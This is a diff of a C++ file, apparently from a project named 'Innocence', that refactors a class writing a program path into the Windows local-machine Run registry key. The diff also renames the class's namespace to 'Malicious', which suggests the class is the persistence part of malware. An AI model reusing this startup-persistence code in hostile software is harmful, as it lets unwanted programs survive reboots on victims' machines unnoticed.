@@ -1,15 +1,12 @@
+#include "ProgramStart.hpp"
+
 #include <system/Registry.hpp>
 #include <common/Log.hpp>
 #include <Innocence.hpp>
-#include <string>
-using namespace System::Registry;
-using namespace std;
 
-#include "ProgramStart.hpp"
-
-namespace Inhibition
+namespace Malicious
 {
-    ProgramStartupKey::ProgramStartupKey(const string& path)
+    ProgramStartupKey::ProgramStartupKey(const std::string& path)
         :programPath(path)
     {
 #ifndef INNOCENCE_DEBUG
@@ -27,29 +24,29 @@ namespace Inhibition
     {
     }
 
-    void ProgramStartupKey::setPath(const string& path)
+    void ProgramStartupKey::setPath(const std::string& path)
     {
         programPath = path;
     }
 
     bool ProgramStartupKey::installed()
     {
-        Key startKey(localMachine, Innocence::RUN_KEY_PATH);
+		System::Registry::Key startKey(System::Registry::localMachine, Innocence::RUN_KEY_PATH);
         return startKey.isValueExists(Innocence::RUN_KEY_NAME);
     }
 
     void ProgramStartupKey::install()
     {
-        Key startKey(localMachine, Innocence::RUN_KEY_PATH);
+        System::Registry::Key startKey(System::Registry::localMachine, Innocence::RUN_KEY_PATH);
         startKey.createValue(Innocence::RUN_KEY_NAME, programPath);
     }
 
     void ProgramStartupKey::uninstall()
     {
-        Key startKey(localMachine, Innocence::RUN_KEY_PATH);
+        System::Registry::Key startKey(System::Registry::localMachine, Innocence::RUN_KEY_PATH);
         if(startKey.isValueExists(Innocence::RUN_KEY_NAME))
         {
             startKey.removeValue(Innocence::RUN_KEY_NAME);
         }
     }
-}
+} // Malicious
